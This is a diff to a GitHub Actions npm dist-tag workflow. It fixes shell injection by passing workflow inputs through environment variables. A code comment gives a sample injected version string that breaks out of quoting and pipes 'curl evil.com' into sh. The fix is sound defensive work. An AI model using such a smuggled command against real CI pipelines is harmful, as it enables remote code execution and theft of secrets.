@@ -51,9 +51,20 @@ jobs:
         run: npm install -g npm@latest
 
       - name: Promote
+        # Inputs piped via env vars rather than inlined as ${{ inputs.* }}
+        # in the script body. Direct ${{ }} interpolation gets substituted
+        # into the bash source BEFORE bash parses it, so a value like
+        #   0.5.2"; curl evil.com|sh; "
+        # would break out of the quoted arg and execute. Even though only
+        # repo maintainers can trigger workflow_dispatch, the env-var
+        # pattern is the standard way to eliminate this entire class of
+        # issue. See docs.github.com/en/actions/security-guides.
+        env:
+          VERSION: ${{ inputs.version }}
+          TAG: ${{ inputs.tag }}
         run: |
           set -e
-          echo "Pointing dist-tag '${{ inputs.tag }}' at clud-bug@${{ inputs.version }}"
-          npm dist-tag add "clud-bug@${{ inputs.version }}" "${{ inputs.tag }}"
+          echo "Pointing dist-tag '${TAG}' at clud-bug@${VERSION}"
+          npm dist-tag add "clud-bug@${VERSION}" "${TAG}"
           echo "---"
           npm dist-tag ls clud-bug
